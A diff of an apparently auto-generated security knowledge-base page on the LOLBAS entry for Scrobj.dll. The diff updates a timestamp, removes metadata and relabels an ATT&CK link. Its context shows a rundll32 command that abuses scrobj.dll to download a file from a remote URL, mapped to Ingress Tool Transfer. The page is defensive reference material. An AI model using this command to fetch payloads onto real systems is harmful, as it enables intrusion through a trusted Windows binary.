@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSLibraries/Scrobj.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Scrobj.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSLibraries"
 aliases:
   - "Scrobj.dll"
@@ -19,16 +19,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Scrobj.dll
-
 Windows Script Component Runtime
-
-## Metadata
-
-- Category: OSLibraries
-- Created: 2021-01-07
-- Author: Eral4m
-- Source Path: yml/OSLibraries/Scrobj.yml
 
 ## Paths
 
@@ -48,7 +39,7 @@ rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
 - Use Case: Download file from remote location.
 - Privileges: User
 - Operating System: Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ## Detections
 
